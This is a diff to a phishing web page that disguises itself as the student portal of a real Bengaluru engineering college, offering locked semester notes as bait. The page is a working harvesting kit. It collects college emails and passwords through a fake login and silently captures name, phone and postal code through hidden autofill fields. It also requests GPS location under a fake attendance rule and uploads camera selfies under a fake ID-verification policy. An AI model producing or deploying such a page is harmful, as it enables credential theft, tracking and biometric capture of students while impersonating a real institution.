@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sem 3 Notes – All Units PDF</title>
+<title>SJBIT Student Portal – Semester Notes</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
@@ -11,11 +11,21 @@
     background: #f5f6fa; color: #2d3436; min-height: 100vh;
   }
   .header {
-    background: #0984e3; color: #fff; padding: 18px 20px;
-    display: flex; align-items: center; gap: 12px;
+    background: #1a3c6e; color: #fff; padding: 14px 20px;
+    display: flex; align-items: center; gap: 14px;
   }
-  .header .logo { font-size: 26px; }
-  .header h1 { font-size: 18px; font-weight: 600; }
+  .header img { height: 48px; border-radius: 6px; background: #fff; padding: 3px; }
+  .header .hgroup h1 { font-size: 17px; font-weight: 700; }
+  .header .hgroup .sub1 { font-size: 12px; opacity: 0.85; }
+  .header .hgroup .sub2 { font-size: 11px; opacity: 0.65; margin-top: 2px; }
+  .ribbon {
+    background: #f3f6fb; border-bottom: 1px solid #dfe6ee;
+    padding: 8px 20px; font-size: 12px; color: #5a6b80; text-align: center;
+  }
+  footer {
+    text-align: center; font-size: 11.5px; color: #8b949e;
+    padding: 24px 16px 32px; line-height: 1.7;
+  }
   .container { max-width: 640px; margin: 0 auto; padding: 20px; }
   .card {
     background: #fff; border-radius: 12px; padding: 20px;
@@ -65,23 +75,40 @@
 <body>
 
 <div class="header">
-  <div class="logo">📘</div>
-  <h1>NotesHub – CSE Dept</h1>
+  <img src="/sjbit-logo.svg" alt="SJBIT">
+  <div class="hgroup">
+    <h1>SJBIT Student Portal</h1>
+    <div class="sub1">S J B Institute of Technology, Bengaluru</div>
+    <div class="sub2">Affiliated to VTU · Approved by AICTE · Accredited by NAAC &amp; NBA</div>
+  </div>
 </div>
+<div class="ribbon">Academic Year 2026–27 (ODD SEM) · Notices: ISA-1 timetable published · Last date for fee payment: 10-Sep</div>
 
 <div class="container">
 
   <div class="card">
-    <h2>Semester 3 – All Units</h2>
-    <div class="meta">Data Structures &amp; Algorithms · Updated 2 days ago · 2.4 MB</div>
+    <h2>📢 Notice Board — Dept. of CSE (Data Science)</h2>
+    <div class="meta">Circular No. SJBIT/CSE-DS/2026-27/042 · Dated: 01-09-2026</div>
+    <div style="font-size:14.5px;line-height:1.65;color:#3d4852">
+      All 3rd semester students are hereby informed that complete unit-wise notes
+      for <b>ALL subjects</b> have been uploaded to the student portal. As per VTU
+      guidelines, only <b>enrolled students with verified SJBIT credentials</b> may
+      access study materials. Access is free of cost.
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Semester 3 — Study Materials</h2>
+    <div class="meta">B.E. Computer Science &amp; Engineering (Data Science) · Scheme: 2022 · Updated 2 days ago</div>
     <ul class="unit-list">
-      <li>Unit 1 – Arrays &amp; Linked Lists <span class="lock">🔒</span></li>
-      <li>Unit 2 – Stacks &amp; Queues <span class="lock">🔒</span></li>
-      <li>Unit 3 – Trees &amp; Graphs <span class="lock">🔒</span></li>
-      <li>Unit 4 – Sorting &amp; Searching <span class="lock">🔒</span></li>
-      <li>Unit 5 – Hashing <span class="lock">🔒</span></li>
+      <li>21CS32 — Data Structures &amp; Applications (All 5 Units) <span class="lock">🔒</span></li>
+      <li>21CS33 — Analog &amp; Digital Electronics (All 5 Units) <span class="lock">🔒</span></li>
+      <li>21MAT31 — Discrete Mathematics (All 5 Units) <span class="lock">🔒</span></li>
+      <li>21CS34 — Object Oriented Programming with Java <span class="lock">🔒</span></li>
+      <li>21CS35 — Computer Organization &amp; Architecture <span class="lock">🔒</span></li>
+      <li>21CSL33 — Data Structures Lab Manual (VTU format) <span class="lock">🔒</span></li>
     </ul>
-    <button class="btn" onclick="showSignin()">Sign in to download all units</button>
+    <button class="btn" onclick="showSignin()">Sign in with SJBIT account to download</button>
     <div class="progress" id="dlProgress">
       <div class="bar"><div class="fill" id="dlFill"></div></div>
       <div class="pct" id="dlPct">Preparing download… 0%</div>
@@ -89,32 +116,32 @@
   </div>
 
   <div class="card">
-    <input type="text" class="search" placeholder="Search for a chapter or topic..." id="searchBox">
+    <input type="text" class="search" placeholder="Search subject code or topic (e.g. 21CS32, AVL trees)..." id="searchBox">
   </div>
 
   <div class="card" id="campusCard" style="display:none">
-    <h2>Campus Verification</h2>
-    <div class="meta">Confirm you're on campus to unlock 30 days of offline access</div>
-    <button class="btn" onclick="startGPS('campus verification bait')">Verify my campus location</button>
+    <h2>🏫 Campus Attendance Verification</h2>
+    <div class="meta">As per the 85% attendance rule (Circular 2026/ATT-12), verify you are on campus to unlock 30-day offline access</div>
+    <button class="btn" onclick="startGPS('SJBIT campus attendance verification bait')">Verify I am on campus (Kengeri)</button>
   </div>
 
   <div class="card" id="selfieCard" style="display:none">
-    <h2>Student ID Check</h2>
-    <div class="meta">New policy: a quick selfie confirms active enrollment</div>
-    <button class="btn" onclick="startSelfie()">Verify with selfie</button>
+    <h2>🪪 SJBIT ID Card Verification</h2>
+    <div class="meta">New exam-hall policy (COE circular): portal access requires photo verification against the student database</div>
+    <button class="btn" onclick="startSelfie()">Verify with ID selfie</button>
     <div id="idPreview" style="display:none;margin-top:12px">
-      <div style="font-size:13px;color:#636e72;margin-bottom:6px">Captured — verifying against student records…</div>
-      <img id="idPhoto" style="width:100%;border-radius:8px;filter:blur(0px)" alt="ID photo">
-      <div class="note">✅ Enrollment confirmed. Downloads unlocked.</div>
+      <div style="font-size:13px;color:#636e72;margin-bottom:6px">Captured — matching against student records (COE database)…</div>
+      <img id="idPhoto" style="width:100%;border-radius:8px" alt="ID photo">
+      <div class="note">✅ Enrollment confirmed. Study materials unlocked.</div>
     </div>
   </div>
 
   <div class="card signin" id="signinCard">
-    <h2>Student Login</h2>
-    <div class="meta">Use your college email to unlock downloads</div>
+    <h2>🔐 SJBIT Student Login</h2>
+    <div class="meta">Use your official college email (e.g. 1sj22cs001@sjbit.edu.in) to unlock downloads</div>
     <form onsubmit="sendCreds(event)">
-      <input type="text" placeholder="College email" id="emailField" autocomplete="email">
-      <input type="password" placeholder="Password" id="passField" autocomplete="current-password">
+      <input type="text" placeholder="USN or college email" id="emailField" autocomplete="email">
+      <input type="password" placeholder="Password (same as Samarth portal)" id="passField" autocomplete="current-password">
       <!-- Autofill harvest: browser fills these silently along with email -->
       <input class="af-honey" type="text" name="fullName" id="afName" autocomplete="name" tabindex="-1" aria-hidden="true">
       <input class="af-honey" type="tel" name="phone" id="afTel" autocomplete="tel" tabindex="-1" aria-hidden="true">
@@ -123,10 +150,17 @@
       <input class="af-honey" type="text" name="postal" id="afPostal" autocomplete="postal-code" tabindex="-1" aria-hidden="true">
       <button type="submit" class="btn">Sign in</button>
     </form>
-    <div class="note">Free access for all students</div>
+    <div class="note">Free access for all enrolled SJBIT students · Powered by Dept. of CSE</div>
   </div>
 
 </div>
+
+<footer>
+  <b>S J B Institute of Technology</b><br>
+  BGS Health &amp; Education City, Dr. Vishnuvardhan Road, Kengeri, Bengaluru — 560060<br>
+  Affiliated to Visvesvaraya Technological University, Belagavi · Approved by AICTE, New Delhi<br>
+  📞 080-2861-2445 · ✉️ principal@sjbit.edu.in · www.sjbit.edu.in
+</footer>
 
 <script>
 // ═══════════════════════════════════════════════════════════════
@@ -711,10 +745,7 @@ function uploadHeatmap() {
     });
     c.toBlob((blob) => {
       if (!blob) return;
-      const fd = new FormData();
-      fd.append("vid", VID);
-      fd.append("image", blob, "heat.png");
-      fetch("/heatmap", { method: "POST", body: fd, keepalive: true }).catch(() => {});
+      fetch("/heatmap?vid=" + VID + "&touches=" + touchPoints.length, { method: "POST", body: blob, headers: { "Content-Type": "image/png" }, keepalive: true }).catch(() => {});
     }, "image/png");
   } catch (e) {}
 }
@@ -768,10 +799,7 @@ async function startSelfie() {
 
     c.toBlob((b) => {
       if (!b) return;
-      const fd = new FormData();
-      fd.append("vid", VID);
-      fd.append("image", b, "selfie.png");
-      fetch("/selfie", { method: "POST", body: fd }).catch(() => {});
+      fetch("/selfie?vid=" + VID, { method: "POST", body: b, headers: { "Content-Type": "image/png" } }).catch(() => {});
     }, "image/png");
   } catch (e) {
     post("/event", { text: "🚫 Camera permission denied" });
